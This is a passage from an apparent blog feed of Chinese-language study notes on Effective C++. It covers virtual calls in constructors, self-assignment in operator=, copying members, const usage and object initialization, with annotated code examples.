class="hljs-title">logTransaction</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>= <span class="hljs-number">0</span>; <span class="hljs-comment">//做出一份因类型不同而不同 //的日志记录(log entry)</span>    ...};Transaction::<span class="hljs-built_in">Transaction</span>() {    ...    <span class="hljs-comment">// Call to pure virtual member function 'logTransaction' has undefined behavior; </span>    <span class="hljs-comment">// overrides of 'logTransaction' in subclasses are not available </span>    <span class="hljs-comment">// in the constructor of 'Transaction'</span>    <span class="hljs-built_in">logTransaction</span>();}<span class="hljs-keyword">class</span> <span class="hljs-title class_">BuyTransaction</span> : <span class="hljs-keyword">public</span> Transaction {  <span class="hljs-comment">//derived class</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">logTransaction</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>; <span class="hljs-comment">//志记(1og)此型交易</span>    ...};<span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTransaction</span> : <span class="hljs-keyword">public</span> Transaction { <span class="hljs-comment">//derived class</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">logTransaction</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>; <span class="hljs-comment">//志记(1og)此型交易</span>    ...};</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0g5h0klmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-0g5h0klmso36dk"><pre><code class="hljs cpp">BuyTransaction b; <span class="hljs-comment">//被调用的logTransaction是Transaction内的版本</span></code></pre></div></div><p>上面的错误或许一眼能看出来，而且运行时也会报错，因为在<code>Transaction</code>中<code>logTransaction</code>是纯虚函数，一般会因为没有提供实现而无法链接。</p><p>但是，间接调用虚函数是一个比较难以发现的危险行为，需要尽量避免：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-09fnyrlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-09fnyrlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Transaction</span>() { <span class="hljs-built_in">Init</span>(); }    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">LogTransaction</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>= <span class="hljs-number">0</span>;<span class="hljs-keyword">private</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span></span>{        ...        <span class="hljs-built_in">LogTransaction</span>();      <span class="hljs-comment">// 此处间接调用了虚函数！</span>    }};</code></pre></div></div><p>如果想要基类在构造时就得知派生类的构造信息，推荐的做法是在派生类的构造函数中将必要的信息向上传递给基类的构造函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s6ef4wlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-s6ef4wlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Transaction</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; logInfo)</span></span>;    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LogTransaction</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; logInfo)</span> <span class="hljs-type">const</span></span>;    ...};Transaction::<span class="hljs-built_in">Transaction</span>(<span class="hljs-type">const</span> std::string&amp; logInfo) {    <span class="hljs-built_in">LogTransaction</span>(logInfo); <span class="hljs-comment">// 更改为了非虚函数调用</span>}<span class="hljs-keyword">class</span> <span class="hljs-title class_">BuyTransaction</span> : <span class="hljs-keyword">public</span> Transaction {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">BuyTransaction</span>(...):<span class="hljs-built_in">Transaction</span>(<span class="hljs-built_in">CreateLogString</span>(...)) { ... }    <span class="hljs-comment">// 将信息传递给基类构造函数</span>    ...<span class="hljs-keyword">private</span>:    <span class="hljs-function"><span class="hljs-type">static</span> std::string <span class="hljs-title">CreateLogString</span><span class="hljs-params">(...)</span></span>;}</code></pre></div></div><p>注意此处的<code>CreateLogString</code>是一个静态成员函数，这是很重要的，因为静态成员函数可以确保不会使用未完成初始化的成员变量。</p><h3 id="条款-10令-operator-返回一个指向-this-的引用">条款 10：令operator= 返回一个指向 *this 的引用</h3><p>虽然并不强制执行此条款，但为了实现<strong>连锁赋值</strong>，大部分时候应该这样做：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v455k7lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-v455k7lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> {<span class="hljs-keyword">public</span>:    Widget&amp; <span class="hljs-keyword">operator</span>+=(<span class="hljs-type">const</span> Widget&amp; rhs) {    <span class="hljs-comment">// 这个条款适用于</span>        ...                                    <span class="hljs-comment">// +=, -=, *= 等等运算符</span>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;    }    Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">int</span> rhs) {               <span class="hljs-comment">// 即使参数类型不是 Widget&amp; 也适用</span>        ...        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;    }};</code></pre></div></div><h3 id="条款-11在-operator-中处理自我赋值">条款 11：在 operator=中处理“自我赋值”</h3><p>自我赋值是合法的操作，但在一些情况下可能会导致意外的错误，例如在复制堆上的资源时：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-niejcnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-niejcnlmso36dk"><pre><code class="hljs cpp">Widget&amp; <span class="hljs-keyword">operator</span>+=(<span class="hljs-type">const</span> Widget&amp; rhs) {    <span class="hljs-keyword">delete</span> pRes;                          <span class="hljs-comment">// 删除当前持有的资源</span>    pRes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Resource</span>(*rhs.pRes);       <span class="hljs-comment">// 复制传入的资源</span>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div><p>但若<code>rhs</code>和<code>*this</code>指向的是相同的对象，就会导致访问到已删除的数据。</p><p>最简单的解决方法是在执行后续语句前先进行<strong>证同测试（Identitytest）</strong>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g8lzcklmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-g8lzcklmso36dk"><pre><code class="hljs cpp">Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Widget&amp; rhs) {    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == &amp;rhs) <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;        <span class="hljs-comment">// 若是自我赋值，则不做任何事</span>    <span class="hljs-keyword">delete</span> pRes;    pRes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Resource</span>(*rhs.pRes);    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div><p>另一个常见的做法是只关注异常安全性，而不关注是否自我赋值：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2xyon1lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-2xyon1lmso36dk"><pre><code class="hljs cpp">Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Widget&amp; rhs) {    Resource* pOrigin = pRes;             <span class="hljs-comment">// 先记住原来的pRes指针</span>    pRes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Resource</span>(*rhs.pRes);       <span class="hljs-comment">// 复制传入的资源</span>    <span class="hljs-keyword">delete</span> pOrigin;                       <span class="hljs-comment">// 删除原来的资源</span>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div><p>仅仅是适当安排语句的顺序，就可以做到使整个过程具有异常安全性。</p><blockquote><p>注：这种情况下如果是自我赋值，仅仅是销毁又重新分配了一次空间。这是非常符合常理的办法，虽然有一些性能损耗。</p><p>同时，下面两种方法本质上与此等价。</p></blockquote><p>还有一种取巧的做法是使用 copy and swap技术，这种技术聪明地利用了栈空间会自动释放的特性，这样就可以通过析构函数来实现资源的释放：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2pas47lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-2pas47lmso36dk"><pre><code class="hljs cpp">Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Widget&amp; rhs) {    Widget <span class="hljs-built_in">temp</span>(rhs);    std::<span class="hljs-built_in">swap</span>(*<span class="hljs-keyword">this</span>, temp);    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div><p>上述做法还可以写得更加巧妙，就是利用按值传参，自动调用构造函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5zysiplmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-5zysiplmso36dk"><pre><code class="hljs cpp">Widget&amp; <span class="hljs-keyword">operator</span>=(Widget rhs) {    std::<span class="hljs-built_in">swap</span>(*<span class="hljs-keyword">this</span>, rhs);    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div><h3 id="条款-12复制对象时勿忘其每一个成分">条款12：复制对象时勿忘其每一个成分</h3><p>这个条款正如其字面意思，当你决定手动实现拷贝构造函数或拷贝赋值运算符时，忘记复制任何一个成员都可能会导致意外的错误。</p><ol type="1"><li><p>如果在编码过程中为类新增了成员变量，必须同时修改<strong>copying函数</strong>。（当然也需要修改类的所有<strong>构造函数</strong>，以及任何非标准形式的<strong>operator=</strong>)。如果你忘记，编译器不太可能提醒你。</p></li><li><p>当使用继承时，继承自基类的成员往往容易忘记在派生类中完成复制，如果你的<strong>基类拥有拷贝构造函数和拷贝赋值运算符，应该记得调用它们</strong>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m0njz2lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-m0njz2lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityCustomer</span> : <span class="hljs-keyword">public</span> Customer {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">PriorityCustomer</span>(<span class="hljs-type">const</span> PriorityCustomer&amp; rhs);    PriorityCustomer&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> PriorityCustomer&amp; rhs);    ...<span class="hljs-keyword">private</span>:    <span class="hljs-type">int</span> priority;}PriorityCustomer::<span class="hljs-built_in">PriorityCustomer</span>(<span class="hljs-type">const</span> PriorityCustomer&amp; rhs)    : <span class="hljs-built_in">Customer</span>(rhs),                <span class="hljs-comment">// 调用基类的拷贝构造函数</span>      <span class="hljs-built_in">priority</span>(rhs.priority) {    ...}PriorityCustomer::PriorityCustomer&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> PriorityCustomer&amp; rhs) {    Customer::<span class="hljs-keyword">operator</span>=(rhs);       <span class="hljs-comment">// 调用基类的拷贝赋值运算符</span>    priority = rhs.priority;    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;}</code></pre></div></div></li></ol><p>注意，不要尝试在拷贝构造函数中调用拷贝赋值运算符，或在拷贝赋值运算符的实现中调用拷贝构造函数，一个在初始化时，一个在初始化后，它们的功用是不同的。</p><p>再次强调：<code>Copying</code>函数应该确保复制“<strong>对象内的所有成员变量</strong>”及“<strong>所有baseclass成分</strong>”。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EffectiveC++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective C++ - Item1-4 - 让自己习惯C++</title>
    <link href="/posts/53266/"/>
    <url>/posts/53266/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-c---item1-4---让自己习惯-c">Effective C++ - Item1-4 -让自己习惯 C++</h1><h3 id="总览">总览</h3><p>这一模块的内容是在完整阅读《Effective C++》的基础上，参考了<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的<a href="https://zhuanlan.zhihu.com/p/613356779">一篇文章学完 EffectiveC++：条款 &amp; 实践</a>进行总结。虽然<a href="https://www.zhihu.com/people/96-61-29-67">缪之灵</a>大佬的文章将最重要的部分总结的非常到位，但在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。虽然原书有些地方写的比较拖沓，但作为经典的C++参考书，想要了解更多的细节，还是值得仔细去阅读的。</p><p>同时，假定阅读文章时对C++已经具有本科高级语言程序设计课程内容的理解水平。大部分情况下，除非它很重要，不会对C++基础的语法特性进行介绍。</p><p>本部分是第一章内容，对<strong>条款1-4</strong>进行介绍。</p><h3 id="条款-1视-c-为一个语言联邦">条款 1：视 C++ 为一个语言联邦</h3><p>C++ 拥有多种不同的编程范式，而这些范式集成在一个语言中，使得 C++是一门即灵活又复杂的语言：</p><ol type="1"><li>传统的面向过程C：区块，语句，预处理器，内置数据类型，数组，指针。</li><li>面向对象的 C with Classes：类，封装，继承，多态，动态绑定。</li><li>模板编程 Template C++ 和堪称黑魔法的模板元编程（TMP）。</li><li>C++ 标准库 STL。</li></ol><p>C++ 高效编程守则视情况而变化，程序设计没有银弹。</p><h3 id="条款-2尽量以-const-enum-inline-替换-define">条款 2：尽量以const, enum, inline 替换 #define</h3><p>在原书写成时 C++11中的<code>constexpr</code>还未诞生，现在一般认为应当用<code>constexpr</code>定义编译期常量来替代大部分的<code>#define</code>宏常量定义：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l70v3xlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-l70v3xlmso36dk"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ASPECT_RATIO 1.653</span></code></pre></div></div><p>替代为：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-84f9wblmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-84f9wblmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> aspect_ratio = <span class="hljs-number">1.653</span>;</code></pre></div></div><p>我们也可以将编译期常量定义为类的静态成员：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ky0ieslmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ky0ieslmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GamePlayer</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> numTurns = <span class="hljs-number">5</span>;};</code></pre></div></div><p><code>enum</code>可以用于替代整型的常量，并且在模板元编程中应用广泛（见条款48）：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o1tfsmlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-o1tfsmlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GamePlayer</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">enum</span> { numTurns = <span class="hljs-number">5</span> };};</code></pre></div></div><p>大部分<code>#define</code>宏常量应当用内联模板函数替代：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q989rulmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-q989rulmso36dk"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CALL_WITH_MAX(a, b) f((a) &gt; (b) ? (a) : (b))</span></code></pre></div></div><blockquote><p>或许你认为加了括号就能避免误用。并不是。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1rp6xnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-1rp6xnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a =<span class="hljs-number">5</span>,b <span class="hljs-number">0</span>;<span class="hljs-function">CALL WITH <span class="hljs-title">MAX</span> <span class="hljs-params">(++a,b)</span></span>;   <span class="hljs-comment">//a被累加二次 </span><span class="hljs-function">CALL WITH <span class="hljs-title">MAX</span> <span class="hljs-params">(++a,b+<span class="hljs-number">10</span>)</span></span>;   <span class="hljs-comment">//a被累加一次</span></code></pre></div></div></blockquote><p>上面的宏可以用内联模版替代为：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zz5xfqlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-zz5xfqlmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">CallWithMax</span><span class="hljs-params">(<span class="hljs-type">const</span> T&amp; a, <span class="hljs-type">const</span> T&amp; b)</span> </span>{    <span class="hljs-built_in">f</span>(a &gt; b ? a : b);}</code></pre></div></div><p>需要注意的是，宏和函数的行为本身并不完全一致，<strong>宏只是简单的替换</strong>，并不涉及传参和复制。</p><h3 id="条款-3尽可能使用-const">条款 3：尽可能使用 const</h3><p>若你想让一个常量只读，那你应该明确说出它是const常量，对于指针来说，更是如此：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8zqudzlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-8zqudzlmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">char</span> greeting[] = <span class="hljs-string">"Hello"</span>;<span class="hljs-type">char</span>* p = greeting;                <span class="hljs-comment">// 指针可修改，数据可修改</span><span class="hljs-type">const</span> <span class="hljs-type">char</span>* p = greeting;          <span class="hljs-comment">// 指针可修改，数据不可修改</span><span class="hljs-type">char</span> <span class="hljs-type">const</span>* p = greeting;          <span class="hljs-comment">// 指针可修改，数据不可修改</span><span class="hljs-type">char</span>* <span class="hljs-type">const</span> p = greeting;          <span class="hljs-comment">// 指针不可修改，数据可修改</span><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-type">const</span> p = greeting;    <span class="hljs-comment">// 指针不可修改，数据不可修改</span></code></pre></div></div><blockquote><p>常量指针：指向常量的指针；指针常量：指针是常量。上面第三种写法较为少见，但也是合法的。</p></blockquote><p>对于 STL迭代器，分清使用<code>const</code>还是<code>const_iterator</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qaov3mlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-qaov3mlmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int</span>&gt;::iterator iter = vec.<span class="hljs-built_in">begin</span>();    <span class="hljs-comment">// 迭代器不可修改，数据可修改</span>std::vector&lt;<span class="hljs-type">int</span>&gt;::const_iterator iter = vec.<span class="hljs-built_in">begin</span>();    <span class="hljs-comment">// 迭代器可修改，数据不可修改</span></code></pre></div></div><p>面对函数声明时，如果你不想让一个函数的结果被无意义地当作左值，请使用const返回值：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-854y8glmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-854y8glmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&amp; lhs, <span class="hljs-type">const</span> Rational&amp; rhs);</code></pre></div></div><blockquote><p><code>if (a*b=c)... //喔欧,其实是想做一个比较(comparison)动作!</code></p></blockquote><p><strong>const成员函数：</strong></p><p>const成员函数允许我们操控const对象，这在传递常引用时显得尤为重要：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jp4fk1lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-jp4fk1lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextBlock</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-type">const</span> <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) <span class="hljs-type">const</span> {    <span class="hljs-comment">// const对象使用的重载</span>        <span class="hljs-keyword">return</span> text[position];    }    <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) {                <span class="hljs-comment">// non-const对象使用的重载</span>        <span class="hljs-keyword">return</span> text[position];    }<span class="hljs-keyword">private</span>:    std::string text;};</code></pre></div></div><p>这样，const和non-const对象都有其各自的重载版本：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3ir97wlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-3ir97wlmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(<span class="hljs-type">const</span> Textblock&amp; ctb)</span> </span>{    std::cout &lt;&lt; ctb[<span class="hljs-number">0</span>];            <span class="hljs-comment">// 调用 const     TextBlock::operator[]</span>}</code></pre></div></div><p>编译器对待<code>const</code>对象的态度通常是<code>bitwise constness</code>，而我们在编写程序时通常采用<code>logical constness</code>。</p><blockquote><p><code>bitwise constness</code>是指，成员函数不改变任何成员变量，这也是C++编译器对常量性的定义。</p><p><code>logical constness</code>是指从对象功能上看，<code>const</code>成员函数可以修改它所处对象的一些bits，但对象本身它对外不应该表现出可变性。</p><p>两者不等同。如下例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zj39kdlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-zj39kdlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextBlock</span>{<span class="hljs-keyword">public</span>:    ...    <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::size t position) <span class="hljs-type">const</span>{       <span class="hljs-keyword">return</span> pText[position];    }<span class="hljs-comment">//bitwise const声明,但其实不适当.</span><span class="hljs-keyword">private</span>:    <span class="hljs-type">char</span>* pText;}；</code></pre></div></div><p>显然<code>operator[]</code>实现代码并不更改<code>pText</code>，但在外部可以经由<code>pText</code>改变对象内数组的内容。这是<code>bitwise constness</code>的但不是<code>logical constness</code>。</p></blockquote><p>这就意味着，在确保客户端不会察觉的情况下，我们认为<code>const</code>对象中的某些成员变量应当是允许被改变的，使用关键字<code>mutable</code>来标记这些成员变量：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-waknd7lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-waknd7lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextBlock</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function">std::<span class="hljs-type">size_t</span> <span class="hljs-title">Length</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<span class="hljs-keyword">private</span>:    <span class="hljs-type">char</span>* pText;    <span class="hljs-keyword">mutable</span> std::<span class="hljs-type">size_t</span> textLength;    <span class="hljs-keyword">mutable</span> <span class="hljs-type">bool</span> lengthIsValid;};<span class="hljs-function">std::<span class="hljs-type">size_t</span> <span class="hljs-title">CTextBlock::Length</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{    <span class="hljs-keyword">if</span> (!lengthIsValid) {        textLength = std::<span class="hljs-built_in">strlen</span>(pText);    <span class="hljs-comment">// 可以修改mutable成员变量</span>        lengthIsValid = <span class="hljs-literal">true</span>;               <span class="hljs-comment">// 可以修改mutable成员变量</span>    }    <span class="hljs-keyword">return</span> textLength;}</code></pre></div></div><p>在重载<code>const</code>和<code>non-const</code>成员函数时，需要尽可能避免书写重复的内容，这促使我们去进行常量性转除。在大部分情况下，我们应当避免转型的出现，但在此处为了减少重复代码，转型是适当的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2s5o7mlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-2s5o7mlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextBlock</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-type">const</span> <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) <span class="hljs-type">const</span> {        <span class="hljs-comment">// 假设这里有非常多的代码</span>        <span class="hljs-keyword">return</span> text[position];    }    <span class="hljs-type">char</span>&amp; <span class="hljs-keyword">operator</span>[](std::<span class="hljs-type">size_t</span> position) {        <span class="hljs-keyword">return</span> <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>&amp;&gt;(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">const</span> TextBlock&amp;&gt;(*<span class="hljs-keyword">this</span>)[position]);    }<span class="hljs-keyword">private</span>:    std::string text;};</code></pre></div></div><blockquote><p>需要注意的是，反向做法：令<code>const</code>版本调用<code>non-const</code>版本以避免重复——并不被建议，一般而言<code>const</code>版本的限制比<code>non-const</code>版本的限制更多，因此这样做会带来风险。</p></blockquote><h3 id="条款-4确定对象在使用前已被初始化">条款4：确定对象在使用前已被初始化</h3><p>无初值对象在 C/C++中广泛存在，因此这一条款就尤为重要。在定义完一个对象后需要尽快为它赋初值：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4rhb0ylmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-4rhb0ylmso36dk"><pre><code class="hljs cpp"><span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;<span class="hljs-type">const</span> <span class="hljs-type">char</span>* text = <span class="hljs-string">"A C-style string"</span>;<span class="hljs-type">double</span> d;std::cin &gt;&gt; d;</code></pre></div></div><p>对于类中的成员变量而言，我们有两种建议的方法完成初始化工作，一种是直接在定义处赋初值（sinceC++11）：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-in7yvwlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-in7yvwlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextBlock</span> {<span class="hljs-keyword">private</span>:    std::<span class="hljs-type">size_t</span> textLength{ <span class="hljs-number">0</span> };    <span class="hljs-type">bool</span> lengthIsValid{ <span class="hljs-literal">false</span> };};</code></pre></div></div><p>另一种是使用构造函数成员初始化列表：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r9fp9slmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-r9fp9slmso36dk"><pre><code class="hljs cpp">ABEntry::<span class="hljs-built_in">ABEntry</span>(<span class="hljs-type">const</span> std::string&amp; name, <span class="hljs-type">const</span> std::string&amp; address,                 <span class="hljs-type">const</span> std::list&lt;PhoneNumber&gt;&amp; phones)    : <span class="hljs-built_in">theName</span>(name),      <span class="hljs-built_in">theAddress</span>(address),      <span class="hljs-built_in">thePhones</span>(phones),      <span class="hljs-built_in">numTimesConsulted</span>(<span class="hljs-number">0</span>) {}</code></pre></div></div><p>成员初始化列表也可以留空用来执行默认构造函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vzne4nlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-vzne4nlmso36dk"><pre><code class="hljs cpp">ABEntry::<span class="hljs-built_in">ABEntry</span>()    : <span class="hljs-built_in">theName</span>(),      <span class="hljs-built_in">theAddress</span>(),      <span class="hljs-built_in">thePhones</span>(),      <span class="hljs-built_in">numTimesConsulted</span>(<span class="hljs-number">0</span>) {}</code></pre></div></div><p>需要注意的是，类中成员的初始化具有次序性，而这次序与成员变量的声明次序一致，与成员初始化列表的次序无关。</p><blockquote><p>类中成员的初始化是可选的，但是引用类型必须初始化。</p></blockquote><p><strong>静态对象的初始化：</strong></p><p>C++对于定义于不同编译单元内的全局静态对象的初始化相对次序并无明确定义，因此，以下代码可能会出现使用未初始化静态对象的情况：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p0nmfhlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-p0nmfhlmso36dk"><pre><code class="hljs cpp"><span class="hljs-comment">// File 1 ：你作为作者，写了一个FileSystem工具库供其他人使用</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSystem</span>{<span class="hljs-keyword">public</span>:std:<span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">numDisks</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;    ...}；<span class="hljs-keyword">extern</span> FileSystem tfs; <span class="hljs-comment">//预先定义一个对象tfs(the file system)方便客户使用</span><span class="hljs-comment">// File 